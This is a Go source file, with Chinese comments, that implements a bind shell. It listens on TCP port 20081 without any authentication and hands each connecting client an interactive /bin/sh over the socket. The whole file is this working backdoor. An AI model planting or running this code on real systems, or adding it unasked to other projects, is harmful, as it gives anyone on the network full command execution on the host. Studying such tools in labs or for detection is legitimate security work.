package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn)  {
	cmd :=exec.Command("/bin/sh","-i")

	/*
	rp读取到的数据
	wp写入的数据
	*/
	rp,wp :=io.Pipe()

	// 将输入的数据，放到exec.Command后执行
	cmd.Stdin=conn

	// 命令执行输出的数据
	cmd.Stdout=wp

	// 建立一个goroutine，复制rp到conn
	go io.Copy(conn,rp)
	cmd.Run()
	conn.Close()
}

func main()  {
	listener,err :=net.Listen("tcp",":20081")
	if err !=nil{
		log.Fatalln(err)
	}

	for {
		conn,err :=listener.Accept()
		if err!=nil{
			log.Fatalln(err)
		}
		go handle(conn)
	}
}